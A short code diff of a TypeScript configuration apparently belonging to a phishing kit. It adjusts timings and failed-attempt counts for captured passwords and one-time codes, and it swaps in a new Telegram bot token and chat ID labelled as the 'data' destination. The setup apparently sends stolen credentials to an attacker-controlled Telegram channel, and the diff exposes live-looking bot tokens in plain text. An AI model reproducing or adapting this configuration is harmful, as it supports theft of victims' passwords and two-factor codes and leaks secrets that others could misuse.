@@ -12,14 +12,14 @@ interface Config {
 }
 const defaultConfig: Config = {
 	settings: {
-		code_loading_time: 5000,
-		max_failed_code_attempts: 1,
+		code_loading_time: 20000,
+		max_failed_code_attempts: 2,
 		max_failed_password_attempts: 1,
-		password_loading_time: 5000,
+		password_loading_time: 1000,
 	},
 	telegram: {
-		data_chatid: "-4738316861",
-		data_token: "7694232216:AAFr1lQiTB-JX7MdBlJ6gXq_yR7VM68Zp0c",
+		data_chatid: "-1002603960061",
+		data_token: "7034258013:AAEivZo6dXxDVDDHPwa_TXJQzykNVIdK0xA",
 	},
 };
 const getConfig = (): Config => {
